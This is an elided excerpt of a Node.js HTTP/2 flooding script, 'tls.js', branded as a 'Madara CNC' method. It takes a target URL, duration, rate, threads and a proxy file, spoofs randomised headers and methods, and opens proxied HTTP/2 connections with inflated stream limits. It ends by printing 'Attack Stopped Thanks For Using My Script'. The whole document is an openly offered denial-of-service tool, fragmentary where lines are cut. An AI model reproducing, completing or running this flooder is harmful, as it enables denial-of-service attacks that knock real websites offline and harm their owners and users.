const net = require("net");
 ...
 if (process.argv.length < 7){console.log("TLS M3THOD Madara CNC, Usage: node tls.js URL TIME RATE(32) THREAD(10) proxy.txt");; process.exit();}
 const headers = {};
...
const randomMethod = Methods[Math.floor(Math.random() * Methods.length)];
 ...
 headers["sec-ch-ua-platform"] = "Windows; Linux; macOS;"
 headers["referer"] = refers,
 ...
 function runFlooder() {
     ...
     Socker.HTTP(proxyOptions, (connection, error) => {
         ...
         const client = http2.connect(parsedTarget.href, {
            ...
            maxConcurrentStreams: 639299292,
            initialWindowSize: 65535,
            maxHeaderListSize: 65536,
            enablePush: false
          },
             maxSessionMemory: 639299292,
 ...
 console.log("Attack Stopped Thanks For Using My Script");
